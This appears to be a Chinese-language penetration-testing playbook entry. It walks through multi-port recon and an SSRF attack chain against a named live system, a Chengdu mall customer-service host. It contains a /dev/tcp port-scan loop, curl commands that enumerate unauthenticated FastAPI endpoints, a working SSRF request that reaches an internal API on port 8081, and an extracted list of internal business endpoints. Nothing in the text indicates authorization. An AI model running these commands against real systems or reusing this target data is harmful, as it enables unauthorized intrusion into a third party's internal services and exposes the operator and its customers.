# Multi-Port Service Chain Discovery（多端口服务链发现）

## 场景

同一 IP 不同端口运行不同后端服务，服务间存在调用链（如 SSRF），形成攻击链。

## 案例：成都万象城客服系统（cdmixc.unionsoft.cn）

### 端口分布

| 端口 | 服务 | 后端 | 认证 |
|------|------|------|------|
| 80 | Microsoft-HTTPAPI/2.0 → 404 | Windows HTTP API | — |
| 443 | nginx 1.22.1 → ASP.NET 4.0 | Unionsoft 三盟敏捷框架 V2018 | ✅ 需登录 |
| 8000 | uvicorn (Python FastAPI) | Voice Agent API v1.0 | ❌ 无认证 |
| 8001 | uvicorn (Python FastAPI) | Voice Agent API (备用) | ❌ 无认证 |
| 8081 | IIS 7.5 + ASP.NET MVC 5.2 | 商场业务 API（CORS: *） | ❌ 无认证 |

### 发现流程

```bash
# 1. 端口扫描
for port in 80 443 8000 8001 8081; do
  timeout 2 bash -c "echo >/dev/tcp/TARGET_IP/$port" 2>/dev/null && echo "OPEN $port"
done

# 2. 每个端口独立探测
# 8000 - GET on POST-only endpoint returns 405 + JSON endpoint list
curl -sI "http://TARGET:8000/"  # Server: uvicorn → Python ASGI
curl -s "http://TARGET:8000/api/upload-audio"  # 405 → JSON endpoint list

# 3. Voice Agent API endpoints discovered
# {
#   "name":"Voice Agent API","version":"1.0.0",
#   "endpoints":{
#     "POST /api/upload-audio":"上传音频文件进行语音识别",
#     "POST /api/forward-request":"转发请求到目标地址",  # SSRF!
#     "POST /api/forward-request-startpoint":"转发请求到目标地址2",
#     "POST /api/tts/synthesize":"文本转语音",
#     "POST /api/tts/synthesize-stream":"文本转语音（流式）",
#     "POST /api/llm-stream":"百炼智能体流式问答",
#     "GET /api/health":"健康检查"
#   }
# }

# 4. Health check confirms service running
curl -s "http://TARGET:8000/api/health"
# → {"code":200,"message":"服务正常运行"}

# 5. SSRF verification
curl -s -X POST "http://TARGET:8000/api/forward-request" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8081/","method":"GET"}'
# → {"code":0,...} → SSRF working

# 6. LLM stream confirms system identity
curl -s -X POST "http://TARGET:8000/api/llm-stream" \
  -H "Content-Type: application/json" \
  -d '{"prompt":"你是谁","session_id":""}'
# → "欢迎光临成都万象城！🌸 我是您的专属客服助手..."

# 7. Port 8081 redirects to /Help (auto-generated API docs)
curl -sI "http://TARGET:8081/"
# → 302 Location: /Help
# → Server: Microsoft-IIS/7.5, X-AspNet-Version: 4.0.30319, X-Aspnetmvc-Version: 5.2
# → Access-Control-Allow-Origin: * (CORS全开放!)

# 8. Extract all API endpoints from Help page
curl -s "http://TARGET:8081/Help" | grep -oP '(?:GET|POST|PUT|DELETE)\s+api/[^\s<"]+' | sort -u
```

### API 端点示例（商场业务系统）

```text
GET  api/Common/GetFloor           # 楼层列表（需参数 Floor/Area/Operat）
GET  api/Common/GetArea            # 区域列表
GET  api/Common/GetOperat          # 操作员列表
GET  api/Common/GetTicketTotal     # 票务统计
GET  api/Common/GetBusinessList    # 商户列表
GET  api/Common/GetBusinessInfo    # 商户详情（SBID）
GET  api/Common/GetActivityList    # 活动列表
GET  api/Common/GetShopCollectList # 商户收藏列表
POST api/Common/SearchAdd          # 添加搜索记录
POST api/Common/SearchAddV2        # 搜索v2
POST api/Common/VisitLog           # 访问日志
POST api/Common/ComplaintAdd       # 投诉提交
POST api/Common/BusinessEdit       # 编辑商户信息
POST api/Common/SalonCollectAdd    # 收藏添加
POST api/Common/SalonCollectDel    # 收藏删除
```

### 攻击链

```
外部 → Port 8000 Voice Agent API（无认证）
  → SSRF（/api/forward-request）
    → Port 8081 内部业务 API（无认证，仅127.0.0.1可访问）
      → 内网数据/服务
```

### 关键技术细节

- **FastAPI 自描述行为**: 用 GET 访问 POST-only 端点，返回 405 + JSON 端点清单。这是 FastAPI 内置的 Method Not Allowed 处理行为，非配置问题
- **uvicorn Server 头**: 确认后端是 Python ASGI 服务
- **ASP.NET MVC Help Page**: AreaRegistration 自动生成 API 文档，`/Help` 路径暴露所有端点
- **CORS 全开放**: `Access-Control-Allow-Origin: *` 允许跨域请求
- **SSRF 响应格式**: `{"code":0,"message":null,"model":null,"data":null}` — code=0 表示请求已转发，但响应数据格式可能为异步/空
- **Upload 字段名**: Pydantic 验证报错会直接暴露期望的字段名（如 `{"field_required":["loc":["body","audio"]]}`）
